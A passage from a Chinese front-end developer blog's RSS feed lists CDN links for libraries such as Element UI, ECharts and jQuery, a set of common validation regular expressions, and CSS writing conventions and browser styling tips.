<p>window 对象中的全局名字 <code>ELEMENT</code></p>
</div>
<div><pre><code>https://cdn.jsdelivr.net/npm/element-ui@2.13.2/lib/index.js
</code></pre><div aria-hidden="true"><div></div></div></div><div><pre><code>https://cdn.jsdelivr.net/npm/element-ui@2.13.2/lib/theme-chalk/index.css
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="echarts-4-9-0" tabindex="-1"> echarts@4.9.0</h2>
<div><p>全局名字</p>
<p>window 对象中的全局名字 <code>echarts</code></p>
</div>
<div><pre><code>https://cdn.jsdelivr.net/npm/echarts@4.9.0/dist/echarts.min.js
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="moment-2-27-0" tabindex="-1"> moment@2.27.0</h2>
<div><p>全局名字</p>
<p>window 对象中的全局名字 <code>moment</code></p>
</div>
<div><pre><code>https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="vue-ls-3-2-1" tabindex="-1"> vue-ls@3.2.1</h2>
<div><p>全局名字</p>
<p>window 对象中的全局名字 <code>VueStorage</code></p>
</div>
<div><pre><code>https://cdn.jsdelivr.net/npm/vue-ls@3.2.1/dist/vue-ls.min.js
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="jquery-3-5-1" tabindex="-1"> jQuery@3.5.1</h2>
<div><p>全局名字</p>
<p>window 对象中的全局名字 <code>$</code></p>
</div>
<div><pre><code>https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js
</code></pre><div aria-hidden="true"><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>常用正则表达式收集</title>
      <link>https://vxhly.github.io/views/web/collect-common-regular-expressions.html</link>
      <guid>https://vxhly.github.io/views/web/collect-common-regular-expressions.html</guid>
      <source url="https://vxhly.github.io/rss.xml">常用正则表达式收集</source>
      <description>前言
收集日常开发中经常用到的一些正则表达式（PS：又一次的懒人速养记）。

</description>
      <category>web</category>
      <pubDate>Sat, 23 Nov 2019 11:22:04 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>收集日常开发中经常用到的一些正则表达式（PS：又一次的懒人速养记）。</p>
</div>

<h2 id="数字字母组合" tabindex="-1"> 数字字母组合</h2>
<div><p>要求</p>
<p>必须包含数字和字母方能过正则验证</p>
</div>
<div><pre><code><span><span>/</span><span>^(?![0-9]+$)(?![a-zA-Z]+$)[0-9A-Za-z]*$</span><span>/</span></span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="身份证号" tabindex="-1"> 身份证号</h2>
<div><p>要求</p>
<p>验证 18 位身份证号, 末尾的 <code>X</code> 为大写</p>
</div>
<div><pre><code><span><span>/</span><span>^(\d{6})(\d{4})(\d{2})(\d{2})(\d{3})([0-9]|X)$</span><span>/</span></span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="大陆的手机号" tabindex="-1"> 大陆的手机号</h2>
<div><p>要求</p>
<p>验证 11 位的大陆手机号码</p>
</div>
<div><pre><code><span><span>/</span><span>^[1](([3][0-9])|([4][5-9])|([5][0-3,5-9])|([6][5,6])|([7][0-8])|([8][0-9])|([9][1,8,9]))[0-9]{8}$</span><span>/</span></span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="email-邮箱地址" tabindex="-1"> Email 邮箱地址</h2>
<div><p>要求</p>
<p>Email 的规则: name@domain<br/> name 最长 64, domain 最长 253, 总长最长 256<br/> name 可以使用任意 ASCII 字符:<br/> 大小写英文字母 a-z, A-Z<br/> 数字 0-9<br/> 字符 !#$%&amp;'*+-/=?^_`{|}~<br/> 字符 . 不能是第一个和最后一个, 不能连续出现两次<br/> 但是有些邮件服务器会拒绝包含有特殊字符的邮件地址<br/> domain 仅限于 26 个英文字母、10 个数字、连词号-<br/> 连词号-不能是第一个字符<br/> 顶级域名（com、cn 等）长度为 2 到 6 个</p>
</div>
<div><pre><code><span><span>/</span><span>^([\w-_]+(?:\.[\w-_]+)*)@((?:[a-z0-9]+(?:-[a-zA-Z0-9]+)*)+\.[a-z]{2,6})$</span><span>/</span><span>i</span></span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="中国的邮政编码" tabindex="-1"> 中国的邮政编码</h2>
<div><p>要求</p>
<p>验证 6 位中国的邮政编码</p>
</div>
<div><pre><code><span><span>/</span><span>^[0-9]\d{5}(?!\d)$</span><span>/</span></span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="密码强度" tabindex="-1"> 密码强度</h2>
<div><p>要求</p>
<p>必须包含大写字母, 小写字母, 数字, 特殊字符四种中的三种, 长度要求 8 到 30 位</p>
</div>
<div><pre><code><span><span>/</span><span>^(?![a-zA-Z]+$)(?![A-Z0-9]+$)(?![A-Z\W_]+$)(?![a-z0-9]+$)(?![a-z\W_]+$)(?![0-9\W_]+$)[a-zA-Z0-9\W_]{8,30}$</span><span>/</span></span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="_16-进制验证" tabindex="-1"> 16 进制验证</h2>
<div><p>要求</p>
<p>必须包含 <code>0x</code> , 不区分大小写, 除去 <code>0x</code> 匹配 4 位</p>
</div>
<div><pre><code><span><span>/</span><span>(^0x[a-fA-F0-9]{1,4}$)|(^[+]{0,1}(\d+)$)</span><span>/</span></span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="正整数" tabindex="-1"> 正整数</h2>
<div><p>要求</p>
<p>验证正整数, 非小数</p>
</div>
<div><pre><code><span><span>/</span><span>^[+]{0,1}(\d+)$</span><span>/</span></span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="url" tabindex="-1"> URL</h2>
<div><p>要求</p>
<p>验证 URL 地址是否合法</p>
</div>
<div><pre><code><span><span>/</span><span>^(https?|ftp):\/\/([a-zA-Z0-9.-]+(:[a-zA-Z0-9.&amp;%$-]+)*@)*((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}|([a-zA-Z0-9-]+\.)*[a-zA-Z0-9-]+\.(com|edu|gov|int|mil|net|org|biz|arpa|info|name|pro|aero|coop|museum|[a-zA-Z]{2}))(:[0-9]+)*(\/($|[a-zA-Z0-9.,?'\\+&amp;%$#=~_-]+))*$</span><span>/</span></span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="协议" tabindex="-1"> 协议</h2>
<div><p>要求</p>
<p>验证 URL 的协议是否为 <code>http</code> 或者 <code>https</code></p>
</div>
<div><pre><code><span><span>/</span><span>^(http?|https)</span><span>/</span></span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="非中文字符" tabindex="-1"> 非中文字符</h2>
<div><p>要求</p>
<p>只能是非中文字符 :</p>
<p>::</p>
<div><pre><code><span><span>/</span><span>^[^\u4e00-\u9fa5]+$</span><span>/</span></span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div></div>
]]></content:encoded>
    </item>
    <item>
      <title>CSS 代码书写顺序以及代码规范</title>
      <link>https://vxhly.github.io/views/web/css-code-writing.html</link>
      <guid>https://vxhly.github.io/views/web/css-code-writing.html</guid>
      <source url="https://vxhly.github.io/rss.xml">CSS 代码书写顺序以及代码规范</source>
      <description>前言
一个优秀的前端开发人员, 在书写 CSS 时必定要注意的重点, 而不是随意的书写 CSS, 这样会给自己还有他人带来困扰。

</description>
      <category>web</category>
      <pubDate>Wed, 24 Aug 2016 20:40:06 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>一个优秀的前端开发人员, 在书写 CSS 时必定要注意的重点, 而不是随意的书写 CSS, 这样会给自己还有他人带来困扰。</p>
</div>

<h2 id="css-文件的编码" tabindex="-1"> CSS 文件的编码</h2>
<p>表明 CSS 文件的页面编码为 UTF-8。 在 CSS 文件的最前面添加如下代码</p>
<p><code>For Example:</code></p>
<div><pre><code>@charset "UTF-8";
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="css-书写顺序" tabindex="-1"> CSS 书写顺序</h2>
<ul>
<li>位置属性 { <code>position</code> , <code>top</code> , <code>right</code> , <code>z-index</code> , <code>display</code> , <code>float</code> 等}</li>
<li>大小 { <code>width</code> , <code>height</code> , <code>padding</code> , <code>margin</code> 等}</li>
<li>文字系列 { <code>font</code> , <code>line-height</code> , <code>letter-spacing</code> , <code>color</code> , <code>text-align</code> 等}</li>
<li>背景 { <code>background</code> , <code>border</code> 等}</li>
<li>其他 { <code>animation</code> , <code>transition</code> 等}</li>
</ul>
<p><code>For Example:</code></p>
<div><pre><code><span>/* Low */</span>
<span>.example</span> <span>{</span>
  <span>color</span><span>:</span> red<span>;</span>
  <span>z-index</span><span>:</span> -1<span>;</span>
  <span>background-color</span><span>:</span> #9e0<span>;</span>
  <span>display</span><span>:</span> inline-block<span>;</span>
  <span>font-size</span><span>:</span> 1.5em<span>;</span>
<span>}</span>

<span>/* Good */</span>
<span>.example</span> <span>{</span>
  <span>z-index</span><span>:</span> -1<span>;</span>
  <span>display</span><span>:</span> inline-block<span>;</span>
  <span>font-size</span><span>:</span> 1.5em<span>;</span>
  <span>color</span><span>:</span> red<span>;</span>
  <span>background-color</span><span>:</span> #9e0<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="利用插件实现自动排序" tabindex="-1"> 利用插件实现自动排序</h3>
<p>使用过 Sublime text 的童鞋应该知道有一款插件 <a href="http://csscomb.com/" target="_blank" rel="noopener noreferrer">CSScomb</a> 是用来自动排序 CSS 属性的, 这是一个不错的偷懒方式, 也是加快开发速度的技巧</p>
<h2 id="css-书写规范" tabindex="-1"> CSS 书写规范</h2>
<h3 id="使用-css-缩写属性" tabindex="-1"> 使用 CSS 缩写属性</h3>
<p>CSS 有些属性是可以缩写的, 比如 padding, margin, font 等等, 这样精简代码同时又能提高用户的阅读体验。</p>
<p><code>For Example:</code></p>
<div><pre><code><span>/* Low */</span>
<span>.box</span> <span>{</span>
  <span>border-top-style</span><span>:</span> none<span>;</span>
  <span>font-family</span><span>:</span> serif<span>;</span>
  <span>font-size</span><span>:</span> 100%<span>;</span>
  <span>line-height</span><span>:</span> 1.6<span>;</span>
  <span>padding-bottom</span><span>:</span> 2em<span>;</span>
  <span>padding-left</span><span>:</span> 1em<span>;</span>
  <span>padding-right</span><span>:</span> 1em<span>;</span>
  <span>padding-top</span><span>:</span> 0<span>;</span>
<span>}</span>

<span>/* Good */</span>
<span>.box</span> <span>{</span>
  <span>border-top</span><span>:</span> 0<span>;</span>
  <span>font</span><span>:</span> 100%/1.6 serif<span>;</span>
  <span>padding</span><span>:</span> 0 1em 2em<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="去掉小数点前的-0" tabindex="-1"> 去掉小数点前的 &quot;0&quot;</h3>
<p>若属性的值小于 1, 建议去掉小数点前的 &quot;0&quot;</p>
<p><code>For Example:</code></p>
<div><pre><code><span>/* Low */</span>
<span>.box</span> <span>{</span>
  <span>font-size</span><span>:</span> 0.8em<span>;</span>
<span>}</span>

<span>/* Good */</span>
<span>.box</span> <span>{</span>
  <span>font-size</span><span>:</span> 0.8em<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="值为-0-时-去掉单位" tabindex="-1"> 值为 0 时, 去掉单位</h3>
<p>若属性的值等于 0 时, 建议去掉值后面跟着的单位</p>
<p><code>For Example:</code></p>
<div><pre><code><span>/* Low */</span>

<span>*</span> <span>{</span>
  <span>margin</span><span>:</span> 0px<span>;</span>
  <span>padding</span><span>:</span> 0px<span>;</span>
<span>}</span>

<span>/* Good */</span>

<span>*</span> <span>{</span>
  <span>margin</span><span>:</span> 0<span>;</span>
  <span>padding</span><span>:</span> 0<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="简写命名" tabindex="-1"> 简写命名</h3>
<p>很多用户都喜欢简写类名, 但前提是要让人看懂你的命名才能简写哦</p>
<p><code>For Example:</code></p>
<div><pre><code><span>/* Low */</span>
<span>.navigation</span> <span>{</span>
  <span>margin</span><span>:</span> 0 0 1em 2em<span>;</span>
<span>}</span>

<span>.atr</span> <span>{</span>
  <span>color</span><span>:</span> #93c<span>;</span>
<span>}</span>

<span>/* Good */</span>
<span>.nav</span> <span>{</span>
  <span>margin</span><span>:</span> 0 0 1em 2em<span>;</span>
<span>}</span>

<span>.author</span> <span>{</span>
  <span>color</span><span>:</span> #93c<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="_16-进制颜色代码可以缩写" tabindex="-1"> 16 进制颜色代码可以缩写</h3>
<p>有些颜色代码是可以缩写的, 我们就尽量缩写吧, 提高用户体验为主, 简写规则: 同时满足 1、 2 相同, 3、 4 相同, 5、 6 相同</p>
<p><code>For Example:</code></p>
<div><pre><code><span>/* Low */</span>
<span>.box</span> <span>{</span>
  <span>color</span><span>:</span> #eebbcc<span>;</span>
<span>}</span>

<span>.font</span> <span>{</span>
  <span>color</span><span>:</span> #333333<span>;</span>
<span>}</span>

<span>/* Good */</span>
<span>.box</span> <span>{</span>
  <span>color</span><span>:</span> #ebc<span>;</span>
<span>}</span>

<span>.font</span> <span>{</span>
  <span>color</span><span>:</span> #333<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="选择器命名规范" tabindex="-1"> 选择器命名规范</h2>
<ul>
<li>长名称或词组可以使用中横线来为选择器命名</li>
<li>一律小写避免使用大写, 区分于 <code>JS</code> 的函数名</li>
<li>强制建议使用英文, 不使用拼音</li>
<li>不建议使用 <code>_</code> 下划线来命名 <code>CSS</code> 选择器, 为什么呢？</li>
</ul>
<p>-- 输入的时候少按一个 <code>shift</code> 键； -- 浏览器兼容问题 （比如使用 <code>_tips</code> 的选择器命名, 在 <code>IE6</code> 是无效的） -- 能良好区分 <code>JavaScript</code> 变量命名（ <code>JS</code> 变量命名是用 <code>_</code> ）</p>
<p><code>For Example:</code></p>
<div><pre><code><span>/* Low */</span>
<span>.maintitle</span> <span>{</span>
  <span>color</span><span>:</span> #e3c<span>;</span>
<span>}</span>

<span>.main_title</span> <span>{</span>
  <span>color</span><span>:</span> #e3c<span>;</span>
<span>}</span>

<span>/* Good */</span>
<span>.main-title</span> <span>{</span>
  <span>color</span><span>:</span> #e3c<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="css-选择器最好不要随意使用-id" tabindex="-1"> CSS 选择器最好不要随意使用 id</h2>
<ul>
<li><code>id</code> 在 <code>JS</code> 是唯一的, 不能多次使用, 而使用 <code>class</code> 类选择器却可以重复使用</li>
<li><code>id</code> 的优先级优先与 <code>class</code> , 所以 <code>id</code> 应该按需使用, 而不能滥用</li>
<li><code>id</code> 选择器多用于 <code>JS</code> 方法的调用</li>
</ul>
<p><code>For Example:</code></p>
<div><pre><code><span>/* Low */</span>
<span>#info-title</span> <span>{</span>
  <span>font-size</span><span>:</span> 3em<span>;</span>
<span>}</span>

<span>/* Good */</span>
<span>.info-title</span> <span>{</span>
  <span>font-size</span><span>:</span> 3em<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="为选择器添加前缀" tabindex="-1"> 为选择器添加前缀</h2>
<ul>
<li>有时候可以给选择器添加一个表示状态的前缀, 让语义更明了</li>
<li>当你在开发属于自己的 <code>CSS</code> 代码时也可以为你的 <code>CSS</code> 代码添加前缀</li>
</ul>
<p><code>For Example:</code></p>
<div><pre><code><span>/* Low */</span>
<span>.whithdrawal</span> <span>{</span>
  <span>background-color</span><span>:</span> #ccc<span>;</span>
<span>}</span>

<span>.divconent</span> <span>{</span>
  <span>width</span><span>:</span> 60rem<span>;</span>
  <span>font-family</span><span>:</span> serif<span>;</span>
  <span>color</span><span>:</span> #999<span>;</span>
<span>}</span>

<span>.sapninline</span> <span>{</span>
  <span>display</span><span>:</span> inline-block<span>;</span>
<span>}</span>

<span>/* Good */</span>
<span>.is-whithdrawal</span> <span>{</span>
  <span>background-color</span><span>:</span> #ccc<span>;</span>
<span>}</span>

<span>.my-div-conent</span> <span>{</span>
  <span>width</span><span>:</span> 60rem<span>;</span>
  <span>font-family</span><span>:</span> serif<span>;</span>
  <span>color</span><span>:</span> #999<span>;</span>
<span>}</span>

<span>.my-sapn-inline</span> <span>{</span>
  <span>display</span><span>:</span> inline-block<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="命名规范举例" tabindex="-1"> 命名规范举例</h2>
<ul>
<li>所有命名一律使用小写</li>
<li>所有的命名一律使用英文, 不使用中文或者拼音</li>
<li>用 <code>-</code> 代替 <code>_</code> , 文件命名时尽量少用 <code>-</code></li>
<li>文件命名时尽量不使用缩写, 除非是一眼就可以看出来该文件是干什么用</li>
<li>文件命名时, 如有该文件的版本号, 尽量要跟上, 如: jquery-2.1.4.min.js</li>
<li>引用外部文件时, 尽量选择压缩版的文件, 这样可以加快网页的加载速度</li>
</ul>
<h3 id="常用的-css-id-命名" tabindex="-1"> 常用的 CSS / ID 命名</h3>
<ul>
<li><strong>header / footer</strong> =&gt; 头部 / 尾部</li>
<li><strong>content / container</strong> =&gt; 内容</li>
<li><strong>nav / subnav</strong> =&gt; 导航 / 子导航</li>
<li><strong>sidebar</strong> =&gt; 侧边栏</li>
<li><strong>row / column</strong> =&gt; 行 / 列</li>
<li><strong>top / left / bottom / right</strong> =&gt; 上 / 左 / 下 / 右</li>
<li><strong>logo</strong> =&gt; 标志</li>
<li><strong>banner</strong> =&gt; 广告</li>
<li><strong>main</strong> =&gt; 页面主体</li>
<li><strong>hot</strong> =&gt; 热点</li>
<li><strong>news</strong> =&gt; 新闻</li>
<li><strong>download</strong> =&gt; 下载</li>
<li><strong>menu / submenu</strong> =&gt; 菜单 / 子菜单</li>
<li><strong>search</strong> =&gt; 搜索</li>
<li><strong>friendlink</strong> =&gt; 友情链接</li>
<li><strong>copyright</strong> =&gt; 版权</li>
<li><strong>tags</strong> =&gt; 标签</li>
<li><strong>list</strong> =&gt; 列表</li>
<li><strong>loginbar</strong> =&gt; 登录条</li>
<li><strong>msg</strong> =&gt; 提示信息</li>
<li><strong>status</strong> =&gt; 状态</li>
</ul>
<h3 id="常用-css-js-文件命名" tabindex="-1"> 常用 CSS / JS 文件命名</h3>
<ul>
<li><strong>master.css</strong> =&gt; 主要的</li>
<li><strong>modeule.css</strong> =&gt; 模块</li>
<li><strong>base.css</strong> =&gt; 基本共用</li>
<li><strong>base.min.css</strong> =&gt; 基本共用样式表压缩版</li>
<li><strong>layout.css</strong> =&gt; **布局、 版面</li>
<li><strong>themes.css</strong> =&gt; 主题</li>
<li><strong>font.css</strong> =&gt; 文字</li>
<li><strong>from.css</strong> =&gt; 表单</li>
<li><strong>jquery-ui-1.9.0.js</strong> =&gt; jQuery UI 的脚本, 版本为 1.9.0</li>
<li><strong>jquery.min.js</strong> =&gt; jQuery 压缩版</li>
<li><strong>base.js</strong> =&gt; 基本共用</li>
<li><strong>from-ajax.js</strong> =&gt; 通过 Ajax 技术提交的表单</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>CSS 的一些冷知识</title>
      <link>https://vxhly.github.io/views/web/css-cold-knowledge.html</link>
      <guid>https://vxhly.github.io/views/web/css-cold-knowledge.html</guid>
      <source url="https://vxhly.github.io/rss.xml">CSS 的一些冷知识</source>
      <description>前言
记录常用而不易于记忆的 css 自定义代码。

</description>
      <category>web</category>
      <pubDate>Wed, 17 Aug 2016 17:27:08 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>记录常用而不易于记忆的 css 自定义代码。</p>
</div>

<h2 id="常见实用技巧" tabindex="-1"> 常见实用技巧</h2>
<div><pre><code><span>/*禁止长按链接与图片弹出菜单*/</span>
<span>a,
img</span> <span>{</span>
  <span>-webkit-touch-callout</span><span>:</span> none<span>;</span>
<span>}</span>

<span>/*禁止ios和android用户选中文字*/</span>
<span>html,
body</span> <span>{</span>
  <span>-webkit-user-select</span><span>:</span> none<span>;</span>
  <span>user-select</span><span>:</span> none<span>;</span>
<span>}</span>

<span>/*改变输入框placeholder的颜色值*/</span>
<span>::-webkit-input-placeholder</span> <span>{</span>
  <span>/* WebKit browsers */</span>
  <span>color</span><span>:</span> #999<span>;</span>
<span>}</span>

<span>:-moz-placeholder</span> <span>{</span>
  <span>/* Mozilla Firefox 4 to 18 */</span>
  <span>color</span><span>:</span> #999<span>;</span>
<span>}</span>

<span>::-moz-placeholder</span> <span>{</span>
  <span>/* Mozilla Firefox 19+ */</span>
  <span>color</span><span>:</span> #999<span>;</span>
<span>}</span>

<span>:-ms-input-placeholder</span> <span>{</span>
  <span>/* Internet Explorer 10+ */</span>
  <span>color</span><span>:</span> #999<span>;</span>
<span>}</span>

<span>input:focus::-webkit-input-placeholder</span> <span>{</span>
  <span>color</span><span>:</span> #999<span>;</span>
<span>}</span>

<span>/*android上去掉语音输入按钮*/</span>
<span>input::-webkit-input-speech-button</span> <span>{</span>
  <span>display</span><span>:</span> none<span>;</span>
<span>}</span>

<span>/* 消除 transition 闪屏 */</span>
<span>.css</span> <span>{</span>
  <span>-webkit-transform-style</span><span>:</span> preserve-3d<span>;</span>
  <span>-webkit-backface-visibility</span><span>:</span> hidden<span>;</span>
  <span>-webkit-perspective</span><span>:</span> 1000<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="placeholder" tabindex="-1"> placeholder</h2>
<p>在 <code>input</code> 标签中设置 <code>placeholder</code> 属性时, 有时候因为需求, 要修改占位符的默认颜色或者字体大小, 这是就可以用下面的 <code>css</code> , <code>For Example:</code></p>
<div><pre><code><span>/* firefox */</span>
<span>input::-moz-placeholder</span> <span>{</span>
  <span>color</span><span>:</span> red<span>;</span>
  <span>font-size</span><span>:</span> 18px<span>;</span>
<span>}</span>

<span>/* IE */</span>
<span>input:-ms-input-placeholder</span> <span>{</span>
  <span>color</span><span>:</span> red<span>;</span>
  <span>font-size</span><span>:</span> 18px<span>;</span>
<span>}</span>

<span>/* chrome */</span>
<span>input::-webkit-input-placeholder</span> <span>{</span>
  <span>color</span><span>:</span> red<span>;</span>
  <span>font-size</span><span>:</span> 18px<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>需要注意的是不同浏览器写法不同:</p>
<ul>
<li>都要加上各自浏览器的前缀(如 <code>-webkit-</code> )</li>
<li><code>firefox</code> 的 <code>placeholder</code> 的前面没有 <code>input-</code></li>
<li><code>firefox</code> 与 <code>chrome</code> 都是 <code>::</code> 两个冒号, 而 IE 则是一个 <code>:</code></li>
<li>低版本的浏览器与新版本浏览器可能写法不同</li>
</ul>
<h2 id="下拉框的小三角" tabindex="-1"> 下拉框的小三角</h2>
<p><code>select</code> 标签会出现小三角, 通常这个小三角都会去掉, 或者用背景图片的方式替换为符合要求的样子。 去掉小三角的 <code>css</code> , <code>For Example:</code></p>
<div><pre><code><span>select</span> <span>{</span>
  <span>-webkit-appearance</span><span>:</span> none<span>;</span>
  <span>/* chrome */</span>
  <span>-moz-appearance</span><span>:</span> none<span>;</span>
  <span>/* firefox */</span>
  <span>/* 在IE浏览器中目前还没找到可以去掉小三角的方法。 */</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="input-type-number-右边的-spinners" tabindex="-1"> input[type=number] 右边的 spinners</h2>
<p><code>nput[type=number]</code> 通常用在移动端设备上, 浏览器会识别 <code>number</code> 输入类型, 然后改变数字键盘来适应它。 但是它会出现 <code>spinners</code> , 一般不需要它。 去掉 <code>spinners</code> 的 <code>css</code> 如下:</p>
<div><pre><code><span>/* firefox */</span>
<span>input[type="number"]</span> <span>{</span>
  <span>-moz-appearance</span><span>:</span> textfield<span>;</span>
<span>}</span>

<span>/* chrome */</span>
<span>input[type="number"]::-webkit-inner-spin-button,
input[type="number"]::-webkit-outer-spin-button</span> <span>{</span>
  <span>-webkit-appearance</span><span>:</span> none<span>;</span>
  <span>margin</span><span>:</span> 0<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="webkit-tap-highlight-color" tabindex="-1"> -webkit-tap-highlight-color</h2>
<p>在移动端浏览器上(如微信、 QQ 内置浏览器), 当你点击一个链接或者通过 <code>JavaScript</code> 定义的可点击元素的时候, 会出现蓝色边框, 我是很讨厌这个边框的, 所以一般会这样去除, <code>For Example:</code></p>
<div><pre><code><span>a,
button,
input,
textarea</span> <span>{</span>
  <span>-webkit-tap-highlight-color</span><span>:</span> <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0<span>)</span><span>;</span>
  <span>-webkit-user-modify</span><span>:</span> read-write-plaintext-only<span>;</span> //-webkit-user-modify有个副作用<span>,</span> 就是输入法不再能够输入多个字符
<span>}</span>

<span>/*也可以..., 简单粗暴*/</span>

<span>*</span> <span>{</span>
  <span>-webkit-tap-highlight-color</span><span>:</span> <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0<span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>将高亮色设为透明, 这样就看不到蓝色边框了。</p>
<h2 id="滚动条" tabindex="-1"> 滚动条</h2>
<p><code>webkit</code> 现在支持拥有 <code>overflow</code> 属性的区域, <code>列表框</code> , <code>下拉菜单</code> , <code>textarea</code> 的滚动条自定义样式。 有时候需要把滚动条去掉, 特别是页面中出现几条滚动条的时候, <code>For Example:</code></p>
<div><pre><code><span>::-webkit-scrollbar</span> <span>{</span>
  <span>width</span><span>:</span> 0<span>;</span>
  <span>/* 这将去除整个页面的滚动条 */</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>设置滚动条的宽度为 <code>0</code> 就可以去除滚动条了。</p>
<h2 id="文字换行" tabindex="-1"> 文字换行</h2>
<p><code>For Example:</code></p>
<div><pre><code><span>.text-warp</span> <span>{</span>
  <span>/* 强制不换行 */</span>
  <span>white-space</span><span>:</span> nowrap<span>;</span>

  <span>/* 自动换行 */</span>
  <span>word-wrap</span><span>:</span> break-word<span>;</span>
  <span>word-break</span><span>:</span> normal<span>;</span>

  <span>/* 强制英文单词断行 */</span>
  <span>word-break</span><span>:</span> break-all<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="文字两端对齐" tabindex="-1"> 文字两端对齐</h2>
<p><code>For Example:</code></p>
<div><pre><code><span>.text-justify</span> <span>{</span>
  <span>text-align</span><span>:</span> justify<span>;</span>
  <span>text-justify</span><span>:</span> inter-ideogra<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h2 id="去掉色焦点框" tabindex="-1"> 去掉色焦点框</h2>
<p>去掉 Webkit(chrome) 浏览器中 input(文本框) 或 textarea 的黄色焦点框, <code>For Example:</code></p>
<div><pre><code><span>input,
button,
select,
textarea</span> <span>{</span>
  <span>outline</span><span>:</span> none<span>;</span>
<span>}</span>

<span>textarea</span> <span>{</span>
  <span>font-size</span><span>:</span> 13px<span>;</span>
  <span>resize</span><span>:</span> none<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="去掉黄色背景" tabindex="-1"> 去掉黄色背景</h2>
<p>chrome 表单自动填充后, input 文本框的背景会变成黄色的, 通过审查元素可以看到这是由于 chrome 会默认给自动填充的 input 表单加上 input:-webkit-autofill 私有属性, 然后对其赋予以下样式:</p>
<p><code>For Example:</code></p>
<div><pre><code><span>input: -webkit-autofill</span> <span>{</span>
  <span>background-color</span><span>:</span> #faffbd<span>;</span>
